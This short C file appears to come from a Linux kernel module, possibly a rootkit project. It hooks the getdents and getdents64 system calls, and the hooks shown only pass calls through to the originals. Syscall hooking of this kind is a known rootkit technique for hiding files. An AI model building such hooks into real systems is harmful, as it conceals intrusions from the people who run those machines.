#include "../inc/hook.h"
#include "../inc/util.h"

#include <linux/module.h>

syscall_t *_getdents = NULL;
syscall_t *_getdents64 = NULL;

asmlinkage int64_t h_getdents(const struct pt_regs *r) {
  orig_get(_getdents, "getdents");
  orig_call(_getdents);
}

asmlinkage int64_t h_getdents64(const struct pt_regs *r) {
  orig_get(_getdents64, "getdents64");
  orig_call(_getdents64);
}
